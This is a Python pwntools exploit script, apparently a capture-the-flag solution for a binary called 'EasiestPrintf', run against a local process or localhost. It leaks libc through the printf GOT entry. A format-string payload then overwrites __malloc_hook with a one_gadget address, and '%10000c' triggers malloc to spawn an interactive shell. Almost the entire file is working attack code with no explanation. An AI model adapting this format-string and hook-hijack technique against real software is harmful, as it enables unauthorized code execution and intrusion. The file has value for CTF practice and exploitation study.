#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = 'i386'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./EasiestPrintf")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./EasiestPrintf")
    libc = elf.libc
    oneGadget = 0x3a9fc
    #  oneGadget = 0x3a9fe
    #  oneGadget = 0x3aa02
    #  oneGadget = 0x3aa09
    #  oneGadget = 0x5f7a5
    #  oneGadget = 0x5f7a6


else:
    io = remote("localhost", 9999)
    libc = ELF("./libc.so.6")
    oneGadget = 0x3e297


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    io.sendlineafter(":\n", str(elf.got['printf']))
    libc.address = int(io.recvuntil("\n", drop = True), 16) - libc.sym['printf']
    success("libc.address -> {:#x}".format(libc.address))
    pause()

    mallocHook = libc.sym['__malloc_hook']
    oneGadget = libc.address + oneGadget

    payload = fmtstr_payload(7, {mallocHook: oneGadget}, write_size = 'int')
    payload += "%10000c"
    io.sendline(payload)
    
    io.interactive()
    io.close()



